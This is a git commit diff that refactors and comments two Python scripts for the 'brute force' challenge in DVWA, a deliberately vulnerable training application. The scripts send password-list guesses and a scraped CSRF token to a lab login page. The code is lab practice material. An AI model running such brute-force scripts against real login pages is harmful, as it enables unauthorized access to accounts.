3aa857439978a5bd012fee922313cadcf09e50e7
tom <tom@tkcyber.com>
2022-03-30 16:31:24 +0100

    Updating comments

--- brute_force/dvwa_brute.py
+++ brute_force/dvwa_brute.py
@@ -1,3 +1,8 @@
+#!/usr/bin/env python3
+#Script to tackle the "brute force" challenge in DVWA
+#Only can be used on the low, medium or high security setting.
+#Be sure to update security, PHPSessionID, password_file and url to match your env.
+
 import requests
 from bs4 import BeautifulSoup as bs
 
@@ -13,8 +18,8 @@ cookies={
         'PHPSESSID' : 'hqkarbdj6vi8gn3gvier9m6qf7'
         }
 
-
-def payload(passwords, crsftoken='#'):
+#Creates a payload for each password in the list
+def payload(passwords=passwords):
   payload = []
 
   for password in passwords:
@@ -22,29 +27,29 @@ def payload(passwords, crsftoken='#'):
                       'username': 'admin',
                       'password': password.strip(), 
                       'Login':'Login', 
-                      'user_token':crsftoken
                       })
 
   return payload
 
+#Get the user_token from html.
 def grabCRSFToken(r):
     soup = bs(r.content,'html.parser')
     return soup.findAll(attrs={"name" : "user_token"})[0].get('value')
 
-def testPassword(payload,cookies):
-    count=0
+#Test the payloads and return Succesful if it works. 
+def testPassword():
+    params = payload()
 
-    for i in payload:
-      count += 1
-      print("Trying Password Number:", count)
-      r = createSession(url, cookies, security, i)
+    for param in params:
+      r = createSession(param)
+      print(r.url)
       
       if "Welcome" in r.text:
-         print(i)
-         print("Success")
+         print("Success: ", r.url)
          quit()
 
-def createSession(url,cookie,security,param):
+#Create and return requests session object. 
+def createSession(param, url=url,cookies=cookies,security=security):
     s = requests.Session()
     if security == 'high':
       r = s.get(url, cookies=cookies)
@@ -55,4 +60,7 @@ def createSession(url,cookie,security,param):
       r = s.get(url, cookies=cookies, params=param)
     return r
 
-testPassword(payload(passwords), cookies)
+def main():
+  testPassword()
+
+main()
--- brute_force/dvwa_brute_low.py
+++ brute_force/dvwa_brute_low.py
@@ -1,17 +1,23 @@
+#!/usr/bin/env python3
+#Script to tackle the "brute force" challenge in DVWA
+#Only can be used on the low or medium security setting. 
+#Be sure to update security, PHPSessionID, password_file and url to match your env. 
+
 import requests
-from bs4 import BeautifulSoup as bs
 
 security="low"
+PHPSessionID='9no6gmk1eqr2dps9lccqic71t5'
 password_file="/tmp/fasttrack.txt"
 url='http://192.168.1.163:8082/vulnerabilities/brute/'
 
 cookies = {'security':security,
-           'PHPSESSID':'9no6gmk1eqr2dps9lccqic71t5'
+           'PHPSESSID':PHPSessionID
            }
 
 with open(password_file,'r') as f:
     passwords = f.readlines()
 
+#Generate a payload for each password. 
 def payloads(passwords=passwords):
     payload = []
     for password in passwords:
@@ -19,16 +25,19 @@ def payloads(passwords=passwords):
 
     return payload
     
+#Test each password and return result. 
 def testPasswords():
     pay = payloads()
     for payload in pay:
         r = createSession(payload)
+        print(r.url)
         if "Welcome" in r.text:
           print("Sucess with :", r.url)
           quit()
 
+#Create and return a reqeusts session object. 
 def createSession(payload,security=security,url=url,cookies=cookies):
-    if security == "low":
+    if security == "low" or security == 'medium':
       s = requests.Session()
       r = s.get(url, cookies=cookies,params=payload)
 
